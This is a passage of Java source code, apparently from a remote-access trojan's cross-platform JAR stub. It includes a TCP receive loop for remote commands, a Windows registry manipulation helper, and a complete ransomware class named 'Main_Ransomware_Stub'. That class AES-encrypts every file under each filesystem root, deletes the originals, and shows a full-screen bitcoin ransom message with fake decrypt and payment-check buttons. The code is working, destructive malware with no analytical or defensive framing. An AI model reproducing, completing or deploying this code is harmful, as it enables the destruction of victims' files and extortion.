			inFromServer = new BufferedReader(new InputStreamReader(tcpclient.getInputStream()));
			 
			 if (tcpclient.isConnected() ==true){
				 initiater.Raise_Connected();  // Raise_Connected."
			 }else{
				 initiater.Raise_Disconnected();  // Raise_Disconnected."
			 }
			 
			 //System.out.println();
			 REC = new Thread(this);
			 REC.start();
		} catch (Exception e) {
			//System.out.println(e.getMessage());
			 initiater.Raise_Disconnected();  // Raise_Disconnected."
				}
		
	 }
	
	@SuppressWarnings("deprecation")
	public void Start_Recieve(){
		while(true){
			 try { System.out.println("working deprecation"+tcpclient.isBound()+tcpclient.isInputShutdown()+tcpclient.isOutputShutdown()+tcpclient.getOOBInline()+tcpclient.getRemoteSocketAddress().toString());}catch(Exception e){}
			  StringBuilder content = new StringBuilder();
			  try {
					
				    int value;
				    int coun = 0;
				 
				    while ((value = inFromServer.read()) != -1) {
				    	
				        content.append((char) value);
				        coun +=1;
				        if(content.toString().endsWith(SPL) && coun > SPL.length()){
				       
				        String Recieved = content.toString().replace(SPL, "");
				        content = new StringBuilder();
				        initiater.Raise_Data(Recieved);
				        }
				        if(tcpclient.isConnected()==false){
							 System.out.println("HHerexx");
							 initiater.Raise_Disconnected();
							 break;
						 }
				       
				    }
				  
			
							
						 }catch (Exception e) {
							 System.out.println("HHere1"+e.getMessage());
							 if(e.getMessage().contains("Connection rese") || e.getMessage().contains("connection abort") || e.getMessage().contains("abort") || e.getMessage().contains("connect")){
								 initiater.Raise_Disconnected();	
								 break;
				    			}
							 try{
								 if(content.toString().length()>0){
									 if(tcpclient.isConnected()==false){
										 System.out.println("HHere1");
										 initiater.Raise_Disconnected();
									 }
									    continue;
								 }else{
									 if(tcpclient.isConnected()==false){
										 System.out.println("HHere2");
										 initiater.Raise_Disconnected();
									 }
								 }
							 }catch (Exception ex){ initiater.Raise_Disconnected();break;}
							 
							//
							/*try{
								REC = null;
							} catch (Exception ex){}
							break;
							*/
							//REC.interrupt();
							//
						}
			 
						
		}
	 
		
		
	}


	@Override
	public void run() {
 //Loops on Receive on another Thread then if something Received will Raise Event
		 //Note  : ==> Loops on Receive on another Thread then if something Received will Raise Event
		   // -- Versi AI Helper 
	 
			Start_Recieve();
	 
	}
	
	
}


 class MessageBox
{

    public static void infoBox(final String infoMessage, final String titleBar)
    {Thread t = new Thread(new Runnable(){
        public void run(){
            JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.WARNING_MESSAGE);
        }
    });
  t.start();

    }
    public static void errorBox_nothread(final String infoMessage, final String titleBar)

    {
            JOptionPane.showMessageDialog(null, infoMessage, titleBar, JOptionPane.ERROR_MESSAGE);
     



    }
} 
 class WinRegistry {
	    public static final int HKEY_CURRENT_USER = 0x80000001;
	    public static final int HKEY_LOCAL_MACHINE = 0x80000002;
	    public static final int REG_SUCCESS = 0;
	    public static final int REG_NOTFOUND = 2;
	    public static final int REG_ACCESSDENIED = 5;

	    public static final int KEY_WOW64_32KEY = 0x0200;
	    public static final int KEY_WOW64_64KEY = 0x0100;

	    private static final int KEY_ALL_ACCESS = 0xf003f;
	    private static final int KEY_READ = 0x20019;
	    private static Preferences userRoot = Preferences.userRoot();
	    private static Preferences systemRoot = Preferences.systemRoot();
	    private static Class<? extends Preferences> userClass = userRoot.getClass();
	    private static Method regOpenKey = null;
	    private static Method regCloseKey = null;
	    private static Method regQueryValueEx = null;
	    private static Method regEnumValue = null;
	    private static Method regQueryInfoKey = null;
	    private static Method regEnumKeyEx = null;
	    private static Method regCreateKeyEx = null;
	    private static Method regSetValueEx = null;
	    private static Method regDeleteKey = null;
	    private static Method regDeleteValue = null;

	    static {
	        try {
	            regOpenKey     = userClass.getDeclaredMethod("WindowsRegOpenKey",     new Class[] { int.class, byte[].class, int.class });
	            regOpenKey.setAccessible(true);
	            regCloseKey    = userClass.getDeclaredMethod("WindowsRegCloseKey",    new Class[] { int.class });
	            regCloseKey.setAccessible(true);
	            regQueryValueEx= userClass.getDeclaredMethod("WindowsRegQueryValueEx",new Class[] { int.class, byte[].class });
	            regQueryValueEx.setAccessible(true);
	            regEnumValue   = userClass.getDeclaredMethod("WindowsRegEnumValue",   new Class[] { int.class, int.class, int.class });
	            regEnumValue.setAccessible(true);
	            regQueryInfoKey=userClass.getDeclaredMethod("WindowsRegQueryInfoKey1",new Class[] { int.class });
	            regQueryInfoKey.setAccessible(true);
	            regEnumKeyEx   = userClass.getDeclaredMethod("WindowsRegEnumKeyEx",   new Class[] { int.class, int.class, int.class });
	            regEnumKeyEx.setAccessible(true);
	            regCreateKeyEx = userClass.getDeclaredMethod("WindowsRegCreateKeyEx", new Class[] { int.class, byte[].class });
	            regCreateKeyEx.setAccessible(true);
	            regSetValueEx  = userClass.getDeclaredMethod("WindowsRegSetValueEx",  new Class[] { int.class, byte[].class, byte[].class });
	            regSetValueEx.setAccessible(true);
	            regDeleteValue = userClass.getDeclaredMethod("WindowsRegDeleteValue", new Class[] { int.class, byte[].class });
	            regDeleteValue.setAccessible(true);
	            regDeleteKey   = userClass.getDeclaredMethod("WindowsRegDeleteKey",   new Class[] { int.class, byte[].class });
	            regDeleteKey.setAccessible(true);
	        }
	        catch (Exception e) {
	            e.printStackTrace();
	        }
	    }

	    private WinRegistry() {  }
 
	    public static String readString(int hkey, String key, String valueName, int wow64)
	            throws IllegalArgumentException, IllegalAccessException,
	            InvocationTargetException
	    {
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            return readString(systemRoot, hkey, key, valueName, wow64);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            return readString(userRoot, hkey, key, valueName, wow64);
	        }
	        else {
	            throw new IllegalArgumentException("hkey=" + hkey);
	        }
	    }
 
	    public static Map<String, String> readStringValues(int hkey, String key, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            return readStringValues(systemRoot, hkey, key, wow64);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            return readStringValues(userRoot, hkey, key, wow64);
	        }
	        else {
	            throw new IllegalArgumentException("hkey=" + hkey);
	        }
	    }
 
	    public static List<String> readStringSubKeys(int hkey, String key, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            return readStringSubKeys(systemRoot, hkey, key, wow64);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            return readStringSubKeys(userRoot, hkey, key, wow64);
	        }
	        else {
	            throw new IllegalArgumentException("hkey=" + hkey);
	        }
	    }
 
	    public static void createKey(int hkey, String key)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int [] ret;
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            ret = createKey(systemRoot, hkey, key);
	            regCloseKey.invoke(systemRoot, new Object[] { new Integer(ret[0]) });
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            ret = createKey(userRoot, hkey, key);
	            regCloseKey.invoke(userRoot, new Object[] { new Integer(ret[0]) });
	        }
	        else {
	            throw new IllegalArgumentException("hkey=" + hkey);
	        }
	        if (ret[1] != REG_SUCCESS) {
	            throw new IllegalArgumentException("rc=" + ret[1] + "  key=" + key);
	        }
	    }
 
	    public static void writeStringValue
	    (int hkey, String key, String valueName, String value, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            writeStringValue(systemRoot, hkey, key, valueName, value, wow64);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            writeStringValue(userRoot, hkey, key, valueName, value, wow64);
	        }
	        else {
	            throw new IllegalArgumentException("hkey=" + hkey);
	        }
	    }
 
	    public static void deleteKey(int hkey, String key)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int rc = -1;
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            rc = deleteKey(systemRoot, hkey, key);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            rc = deleteKey(userRoot, hkey, key);
	        }
	        if (rc != REG_SUCCESS) {
	            throw new IllegalArgumentException("rc=" + rc + "  key=" + key);
	        }
	    }
 
	    public static void deleteValue(int hkey, String key, String value, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int rc = -1;
	        if (hkey == HKEY_LOCAL_MACHINE) {
	            rc = deleteValue(systemRoot, hkey, key, value, wow64);
	        }
	        else if (hkey == HKEY_CURRENT_USER) {
	            rc = deleteValue(userRoot, hkey, key, value, wow64);
	        }
	        if (rc != REG_SUCCESS) {
	            throw new IllegalArgumentException("rc=" + rc + "  key=" + key + "  value=" + value);
	        }
	    }

	    //========================================================================
	    private static int deleteValue(Preferences root, int hkey, String key, String value, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key), new Integer(KEY_ALL_ACCESS | wow64)
	        });
	        if (handles[1] != REG_SUCCESS) {
	            return handles[1];  // can be REG_NOTFOUND, REG_ACCESSDENIED
	        }
	        int rc =((Integer) regDeleteValue.invoke(root, new Object[] {
	                new Integer(handles[0]), toCstr(value)
	        })).intValue();
	        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
	        return rc;
	    }

	    //========================================================================
	    private static int deleteKey(Preferences root, int hkey, String key)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int rc =((Integer) regDeleteKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key)
	        })).intValue();
	        return rc;  // can REG_NOTFOUND, REG_ACCESSDENIED, REG_SUCCESS
	    }

	    //========================================================================
	    private static String readString(Preferences root, int hkey, String key, String value, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key), new Integer(KEY_READ | wow64)
	        });
	        if (handles[1] != REG_SUCCESS) {
	            return null;
	        }
	        byte[] valb = (byte[]) regQueryValueEx.invoke(root, new Object[] {
	                new Integer(handles[0]), toCstr(value)
	        });
	        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
	        return (valb != null ? new String(valb).trim() : null);
	    }

	    //========================================================================
	    private static Map<String,String> readStringValues(Preferences root, int hkey, String key, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        HashMap<String, String> results = new HashMap<String,String>();
	        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key), new Integer(KEY_READ | wow64)
	        });
	        if (handles[1] != REG_SUCCESS) {
	            return null;
	        }
	        int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[] {
	                new Integer(handles[0])
	        });

	        int count  = info[2]; // count
	        int maxlen = info[3]; // value length max
	        for(int index=0; index<count; index++)  {
	            byte[] name = (byte[]) regEnumValue.invoke(root, new Object[] {
	                    new Integer(handles[0]), new Integer(index), new Integer(maxlen + 1)
	            });
	            String value = readString(hkey, key, new String(name), wow64);
	            results.put(new String(name).trim(), value);
	        }
	        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
	        return results;
	    }

	    //========================================================================
	    private static List<String> readStringSubKeys(Preferences root, int hkey, String key, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        List<String> results = new ArrayList<String>();
	        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key), new Integer(KEY_READ | wow64)
	        });
	        if (handles[1] != REG_SUCCESS) {
	            return null;
	        }
	        int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[] {
	                new Integer(handles[0])
	        });

	        int count  = info[0]; // Fix: info[2] was being used here with wrong results. Suggested by davenpcj, confirmed by Petrucio
	        int maxlen = info[3]; // value length max
	        for(int index=0; index<count; index++)  {
	            byte[] name = (byte[]) regEnumKeyEx.invoke(root, new Object[] {
	                    new Integer(handles[0]), new Integer(index), new Integer(maxlen + 1)
	            });
	            results.add(new String(name).trim());
	        }
	        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
	        return results;
	    }

	    //========================================================================
	    private static int [] createKey(Preferences root, int hkey, String key)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        return (int[]) regCreateKeyEx.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key)
	        });
	    }

	    //========================================================================
	    private static void writeStringValue(Preferences root, int hkey, String key, String valueName, String value, int wow64)
	            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException
	    {
	        int[] handles = (int[]) regOpenKey.invoke(root, new Object[] {
	                new Integer(hkey), toCstr(key), new Integer(KEY_ALL_ACCESS | wow64)
	        });
	        regSetValueEx.invoke(root, new Object[] {
	                new Integer(handles[0]), toCstr(valueName), toCstr(value)
	        });
	        regCloseKey.invoke(root, new Object[] { new Integer(handles[0]) });
	    }

	   
	    private static byte[] toCstr(String str) {
	        byte[] result = new byte[str.length() + 1];

	        for (int i = 0; i < str.length(); i++) {
	            result[i] = (byte) str.charAt(i);
	        }
	        result[str.length()] = 0;
	        return result;
	    }
	}
 class Main_Ransomware_Stub {
	 private boolean is_read_data = false;
	 private static  byte[] keyValue;
	 private static final String ALGORITHM = "AES";
	 private static String Encryption_Key_value = "";
	 private static final String ALPHABET = "0126%9afg^ijklm-NOPQRST#UVWX#bcde$Y)ZAB@C7DEF&*HIJ$KLM-nopq)345r(stuv(wxyz-@#$8";
	 private static String File_Seperator="";
	 private static final SecureRandom RANDOM = new SecureRandom();
	 private String bitcoing_adress = "No BITCOIN Sir , Your Files Are Toughly Encrypted , No Money Needed";
	 private String Extention = "";
	 private  String generate_password(int count) {
	     StringBuilder sb = new StringBuilder();
	     for (int i = 0; i < count; ++i) {
	         sb.append(ALPHABET.charAt(RANDOM.nextInt(ALPHABET.length())));
	     }
	     return sb.toString();
	 }
	 
	 public Main_Ransomware_Stub(String bitcoin,String extention,String Hacker_data,boolean global) throws URISyntaxException{
	 	try {
	 		 String plat_For_Base = "" ; //Detect if windows , Mac , Linux Based 
		 	 String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
		 	 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
		 		 plat_For_Base = "mac os";
		 		 File_Seperator = "/";
		 	      } else if (platform.indexOf("win") >= 0) {
		 	    	  File_Seperator = "\\";
		 	    		 plat_For_Base = "win-jar";
		 	      } else if (platform.indexOf("nux") >= 0) {
		 	    	  File_Seperator = "/";
		 	    		 plat_For_Base = "linux";
		 	      } else {
		 	    	  File_Seperator = System.getProperty("path.separator");
		 	    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		 	    		  File_Seperator = System.getProperty("file.separator");
		 	    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
		 	    			  File_Seperator = "/";
		 	    		  }
		 	    	  }
		 	      }
		 	  String operSys = System.getProperty("os.name").toLowerCase();
		         if (operSys.contains("mac")||operSys.contains("darwin")) {
		         	 File_Seperator = "/";
		         } else if (operSys.contains("nix") || operSys.contains("nux")
		                 || operSys.contains("aix")) {
		         	 File_Seperator = "/";
		         } else if (operSys.contains("win")) {
		         	 File_Seperator = "\\";
		         } else if (operSys.contains("sunos") ||operSys.contains("solaris") ) {//
		         	plat_For_Base = "solaris".toUpperCase();
		         	 File_Seperator = "/";
		         }
		      
	         
	      } 
	      catch (Throwable ex) {
	         
	      } 
	 	File currentJavaJarFile = new File(Main_Ransomware_Stub.class.getProtectionDomain().getCodeSource().getLocation().getPath());   
	 	String currentJavaJarFilePath = currentJavaJarFile.getAbsolutePath();
	 	String currentRootDirectoryPath = currentJavaJarFilePath.replace(currentJavaJarFile.getName(), "");
	 	Encryption_Key_value = generate_password(16);
	 	set_Ransomware_Configuration(bitcoin,extention);//bitcoin,extn
	 	CreateFile_And_Write_Key_Extention(Encryption_Key_value,Extention,currentRootDirectoryPath,Hacker_data,global);
	 	
		
	 	Start_Destroying_Helper(); 
	 	 MainTainGUI();
	  	/*Thread t = new Thread(new Runnable(){
	         public void run(){
	         	 
	                      	  }
	     });
	   t.start();*/


	 }
	 private void CreateFile_And_Write_Key_Extention(String key,String Extention,String key_file_path,String hacker_data,boolean global){
	 	try{
	 		if(global){
	 			key = "Key was Null , Failture";
	 		}
	 		  String property = "java.io.tmpdir";
			     String tempDir = System.getProperty(property);
	 	    String data = "files_extention="+Extention+"\nfile_enc_key="+key+"\nHackerData/RAT User :"+hacker_data;
	 		//byte[] encryptionKey = "".getBytes(StandardCharsets.UTF_8);
	 		byte[] plainText = data.getBytes(StandardCharsets.UTF_8);
	 		//AdvancedEncryptionStandard advancedEncryptionStandard = new AdvancedEncryptionStandard(
	 		  //      encryptionKey);
	 		//byte[] cipherText = advancedEncryptionStandard.encrypt(plainText);
	 		//byte[] decryptedCipherText = advancedEncryptionStandard.decrypt(cipherText);
	 		//String Tardata = new String(cipherText);
	 		  String target_file2 = tempDir + File_Seperator + "BlueEagle-XPR.Ransomkey";
	 		    Check_Renaming_Helper(target_file2,tempDir);
	 	        FileOutputStream out2 = new FileOutputStream(target_file2);
	 	        out2.write(plainText);
	 	        out2.close();
	 	        
	 		    String target_file = key_file_path + File_Seperator + "BlueEagle-XPR.Ransomkey";
	 		 FileOutputStream out = new FileOutputStream(target_file);
	 	        out.write(plainText);
	 	        out.close();
	 		    Check_Renaming_Helper(target_file,key_file_path);
	 	}catch (Exception ex){
	 		File currentJavaJarFile = new File(Main_Ransomware_Stub.class.getProtectionDomain().getCodeSource().getLocation().getPath());   
	 		String currentJavaJarFilePath = currentJavaJarFile.getAbsolutePath();
	 		String currentRootDirectoryPath = currentJavaJarFilePath.replace(currentJavaJarFile.getName(), "");
	 		File x = new File(currentRootDirectoryPath + File_Seperator + "BlueEagle-XPR.Ransomkey");
	 		x.delete();
	 		 
	 	}
	 } 
	 private int Retry_Once = 0;
	 private void Check_Renaming_Helper(String target_file,String key_file_path){
	 	  //Check Rename Section
	     int Rename_counter_Versions = 0;
	
	     File x = new File(target_file);
	     if(x.exists() == true ){
	     	Rename_counter_Versions +=1;
	     	Rename_Existing(target_file,key_file_path,"BlueEagle-XPR-"+ Rename_counter_Versions + "Times"+ ".Ransomkey");
	     }else{
	     	 return;
	     }
	     
	 if(Retry_Once ==0){
		 if(x.exists() == false ){
			 return;
		 }else{
			   target_file = key_file_path + File_Seperator + "BlueEagle-XPR-"+ Rename_counter_Versions + "Times"+ ".Ransomkey";
				  Retry_Once ++;
	 	  Check_Renaming_Helper(target_file,key_file_path);
	 
		 }
	 	 
	 }
	     
	     
	     //Check Rename Section
	 }
	 private void Rename_Existing(String filedir_rename_withfname,String filedir_rename_not_include_name,String new_name){
	   try{
	 		   File file = new File(filedir_rename_withfname);
	 		   if (file.exists()){
	 			   if (file.canWrite()){
	 				    
	 					   file.renameTo(new File(filedir_rename_not_include_name + File_Seperator + new_name));
	 				  
	 			   }
	 		   }
	 		   
	 	   }catch (Exception ex){
	 		   
	 	   }
	 	   return;
	 }
	 private void Start_Destroying_Helper(){
	 		 File[] f = File.listRoots();
	       for (int i = 0; i < f.length; i++)
	       {
	      Start_Destroying(f[i].getAbsolutePath());
	       }
	       
	 }
	 	private void Start_Destroying(String Parent_Location){
	 		if (Encryption_Key_value.equals("")==false){
	 			Prepate_Key_For_Encryption(Encryption_Key_value);
	 			
		 		String Dir_path = Parent_Location;
		 		 File folder = new File(Dir_path);
		 		   File[] listOfFiles = folder.listFiles();

		 		   for (int i = 0; i < listOfFiles.length; i++) {
		 		      if (listOfFiles[i].isDirectory()) {
		 		    	DestroyDirecroty(listOfFiles[i].getAbsolutePath());
		 		     }
		 		   }
	 		}else {
	 			
		 		String Dir_path = Parent_Location;
		 		 File folder = new File(Dir_path);
		 		   File[] listOfFiles = folder.listFiles();

		 		   for (int i = 0; i < listOfFiles.length; i++) {
		 		      if (listOfFiles[i].isDirectory()) {
		 		    	DestroyDirecroty(listOfFiles[i].getAbsolutePath());
		 		     }
		 		   }
		 		   }
	 	
	 		

	 		
	 	}
	 	 private static void Prepate_Key_For_Encryption(String CurrentGenerated){
	 		 Encryption_Key_value = CurrentGenerated;
	 		 keyValue = CurrentGenerated.getBytes();
	 	 }
	 	 private  Key generateKey() throws Exception {
	 			Key key = new SecretKeySpec(keyValue, ALGORITHM);
	 			return key;
	 		}
	 	 private  void DestroyDirecroty(String Location){
	 			File inputFile;
	 			File outputFile;
	 			File folder = new File(Location);
	 			File[] listOfFiles = folder.listFiles();
	 			for (int i = 0; i < listOfFiles.length; i++) {
	 				try{
	 					// is a file: 
	 					if (listOfFiles[i].isFile()) {
	 						try{
	 							if (listOfFiles[i].toString().endsWith(Extention)==false){
	 									if (listOfFiles[i].toString().endsWith(".Ransomkey")==false){
	 										if(listOfFiles[i].getPath().contains("BlueEagle-XPR.Ransomkey") ==false){
	 											inputFile = new File(listOfFiles[i].getPath());
	 											outputFile = new File(listOfFiles[i].getPath() + Extention);
	 											try{
	 											CryptFile(inputFile,outputFile);
	 											listOfFiles[i].delete();
	 											}catch(Exception ex){}
	 										}

	 									}
	 								}
	 									
	 								}
	 								catch (Exception E){}
	 							
	 								    
	 					} 
	 					// is a folder:
	 					else if (listOfFiles[i].isDirectory()) {
	 						DestroyDirecroty(listOfFiles[i].getPath());
	 					}
	 				}catch(Exception ex){
	 				//If error Occured will bypass it and keep going
	 				}
	 				
	 			}
	 			
	 		}
	 	 private  void CryptFile(File inputFile, File outputFile) throws Exception {
	 			
	 			 try{
	 					Key secretKey = generateKey();
	 					Cipher cipher = Cipher.getInstance(ALGORITHM);
	 					cipher.init(Cipher.ENCRYPT_MODE, secretKey);
	 					FileInputStream inputStream = new FileInputStream(inputFile);
	 					byte[] inputBytes = new byte[(int) inputFile.length()];
	 					inputStream.read(inputBytes);
	 					byte[] outputBytes = cipher.doFinal(inputBytes);
	 					FileOutputStream outputStream = new FileOutputStream(outputFile);
	 					outputStream.write(outputBytes);
	 					inputStream.close();
	 					outputStream.close();
	 				 
	 				 
	 			 }catch (Exception ex){ }
	 		
	 		
	 	}
	 	 private void  set_Ransomware_Configuration(String bitc,String ext) {
	 		  {
	 		 
	 				if (is_read_data == false){
	 					try {
	 						 
	 				 
	 							bitcoing_adress = bitc;
	 							Extention = ext;
	 							is_read_data = true;
	 						 
	 					} catch (Exception e) {
	 						File currentJavaJarFile = new File(Main_Ransomware_Stub.class.getProtectionDomain().getCodeSource().getLocation().getPath());   
	 						String currentJavaJarFilePath = currentJavaJarFile.getAbsolutePath();
	 						String currentRootDirectoryPath = currentJavaJarFilePath.replace(currentJavaJarFile.getName(), "");
	 						File x = new File(currentRootDirectoryPath + File_Seperator + "BlueEagle-XPR.Ransomkey");
	 						x.delete();
	 						 
	 					}
	 				}
	 			
	 			}
	 		  }
	 	 
	 	 
	 	 /*
	 	  * 	000000000           00      00        00000000
	 	  * 	0		00          00      00           00
	 	  *     0                   00      00           00
	 	  *     0    00000          00      00           00
	 	  *     0      0            00      00           00
	 	  *     00000000            00000000000__     000000000
	 	  *    
	 	  *    */
	 	 	
	 	 private void MainTainGUI(){
	 		 String Message = "############ " + Extention.replace(".", "") + " jRAT Remote Ransomware ###########\nWhat Happened to my computer?\n########################################\nNothing happened ,"+" Just your computer has been hacked and then you see a [Ransomware] on your screen , \nyou have been hacked by "+" Kid RAT User , Not Programmer (Saher blue eagle Ransomware)\nthis Ransomware was Not Coded by HACKER / RAT User /  [" + Extention + "] <= he is just a kid hacker." +  "\nSo to sum up "+"[All of your usable files have been encrypted safely].\n########################################\nHow do i set my files free ?\n#############"+"###########################\nYou can use Decrypt in this Program,simply But it will ask "+"you for a password ,\nSo to get the password you have to pay  at bitcoin and don`t close internet connection "+", \n every PC has it`s own signature"+" ,\nso if you don`t follow the steps you will lose your files forever"+".\n########################################\n"+ "Note : The programmer is not responsible for what happend to your (Windows or MAC or Linux) Computer, \nYour Computer was hacked by a kid hacker who uses this Tool in the wrong way .\nWhat is the Tool? ##################\nThe tool is an [XPR] this stands for Cross Platform RAT,this tool is a \nWindows Executable Application which is Tcp Controller that can build a trojan of 2 instances,\none of them is EXE [.exe trojan file] which works on windows platforms only,\nand the other instance is JAR [.jar Executable trojan file] which targets the rest of platforms , \nSUMMARY\n######################\nThe controller is only [EXE which controls (exe & jar) Trojans]. \nThis tool will be extremely dangerous if it fall in wrong hands and causes harm to the public [Like you] " + "\nHow do I get password ?\n########################################\nJust i told you\nStep\n1 : Never Stop Interne"+"t connection\n(you will be at risk) \nStep #2 : Pay to the kid hacker who used this tool in a wrong way , this is also a risk .\n Note : The programmer may release a Decrypter Soon , for this Ransomware . \nBut you have to keep the key file [BlueEagle-XPR.Ransomkey].\nOnce the decrypter will be released download it and load the key file and it will decrypt your files automatically.\nNote : for hint there is file left contains key and everything about hacker`s PC ip address and timing and PC signature incase needed to report his bad usage of the program";
	 		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
	 		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 	
	 			final JFrame MainForm = new JFrame();
	 			MainForm.setSize(widthx + 20, heightx +20);
	 			MainForm.getContentPane().setBackground(Color.BLACK);
	 			MainForm.setLocationRelativeTo(null); 
	 			MainForm.setLocation(-5, -5);
	 			MainForm.setResizable(false);
	 			MainForm.setLayout(null);
	 			MainForm.setTitle("Blue Eagle -XPR Java Ransomware");

	 			JTextArea Textbox  = new JTextArea();
	 			Textbox.setEditable(false);
	 			Textbox.setText(Message);
	 			Textbox.setBackground(Color.DARK_GRAY);
	 			Textbox.setForeground(Color.white);
	 			Textbox.setLayout(null);
	 			Textbox.setBounds(5, 5, widthx -15 , heightx-160);
	 			Textbox.setSelectionStart(0);
	 			Textbox.setSelectionEnd(Message.length()-1);
	 		    Font font = new Font("Monaco", Font.ROMAN_BASELINE, 15);
	 		    Textbox.setFont(font);
	 			Textbox.setVisible(true);
	 			
	 			final JLabel Label = new JLabel("Bitcoin : ");
	 			Label.setLayout(null);
	 			Label.setForeground(Color.GREEN);
	 			Label.setBackground(Color.BLACK);
	 			Label.setText("BitCoin : ");
	 			Label.setBounds(5, heightx-140, 70,35);
	 			Label.setVisible(true);
	 			

	 			final JTextArea Textbox2  = new JTextArea();
	 			Textbox2.setEditable(false);
	 			Textbox2.setText(bitcoing_adress);
	 			Textbox2.setBackground(Color.DARK_GRAY);
	 			Textbox2.setForeground(Color.WHITE);
	 			Textbox2.setLayout(null);
	 			Textbox2.setBounds(75, heightx-140,  widthx -15 , 35);
	 			Textbox2.setVisible(true);
	 			
	 			
	 			JButton Button1 = new JButton("Decrypt Files");
	 			Button1.setText("Decrypt Files");
	 			Button1.setForeground(Color.GREEN);
	 			Button1.setBackground(Color.BLACK);
	 			Button1.setLayout(null);
	 			Button1.setBounds(5,heightx-100, 150, 35);
	 			Button1.setVisible(true);
	 			
	 			Button1.addActionListener(new ActionListener()
	 			{
	 			  public void actionPerformed(ActionEvent e)
	 			  {
	 			    // display/center the jdialog when the button is pressed
	 				  JDialog d = new JDialog(MainForm, "File Decrypter", true);
	 				    d.setSize(450, 100);
	 				    JLabel Labelx = new JLabel("Bitcoin : ");
	 					Label.setLayout(null);
	 					Labelx.setText("   Error You Didn`t Pay , Please Complete Payment then Check the Payment");
	 					Labelx.setBounds(5, 5, 70,35);
	 					Textbox2.setText(bitcoing_adress);
	 					Textbox2.updateUI();
	 					Labelx.setVisible(true);
	 					d.add(Labelx);
	 				    d.setResizable(false);
	 				    d.setLocationRelativeTo(MainForm);
	 				    d.setVisible(true);
	 			  }

	 			 
	 			});
	 			
	 			JButton Button2 = new JButton("Check For Payment");
	 			Button2.setText("Check For Payment");
	 			Button2.setForeground(Color.GREEN);
	 			Button2.setBackground(Color.BLACK);
	 			Button2.setLayout(null);
	 			Button2.setBounds(widthx -160,heightx-100, 150, 35);
	 			Button2.setVisible(true);
	 			
	 			Button2.addActionListener(new ActionListener()
	 			{
	 			  public void actionPerformed(ActionEvent e)
	 			  {
	 			    // display/center the jdialog when the button is pressed
	 			    JDialog d = new JDialog(MainForm, "Payment Checker", true);
	 			    d.setSize(450, 100);
	 			    JLabel Labelx = new JLabel("Bitcoin : ");
	 				Label.setLayout(null);
	 				Labelx.setText("   Error You Didn`t Pay , Please Complete Payment and Recheck Here Again");
	 				Labelx.setBounds(5, 5, 70,35);
	 				Textbox2.setText(bitcoing_adress);
	 				Textbox2.updateUI();
	 				Labelx.setVisible(true);
	 				d.add(Labelx);
	 			    d.setResizable(false);
	 			    d.setLocationRelativeTo(MainForm);
	 			    d.setVisible(true);
	 			  }

	 			 
	 			});

	 			
	 			MainForm.add(Button2);
	 			MainForm.add(Button1);
	 			MainForm.add(Textbox);
	 			MainForm.add(Textbox2);
	 			MainForm.add(Label);
	 			MainForm.setUndecorated(true);
	 			MainForm.setVisible(true);
	 			//MainForm.setExtendedState(JFrame.MAXIMIZED_BOTH); 
	 			Textbox.setSelectionStart(0);
	 			Textbox.setSelectionEnd(Message.length()-1);
	 		}
	 }


	 class AdvancedEncryptionStandard
	 {
	     private byte[] key;

	     private static final String ALGORITHM = "AES";

	     public AdvancedEncryptionStandard(byte[] key)
	     {
	         this.key = key;
	     }

	     public byte[] encrypt(byte[] plainText) throws Exception
	     {
	         SecretKeySpec secretKey = new SecretKeySpec(key, ALGORITHM);
	         Cipher cipher = Cipher.getInstance(ALGORITHM);
	         cipher.init(Cipher.ENCRYPT_MODE, secretKey);

	         return cipher.doFinal(plainText);
	     }

	     public byte[] decrypt(byte[] cipherText) throws Exception
	     {
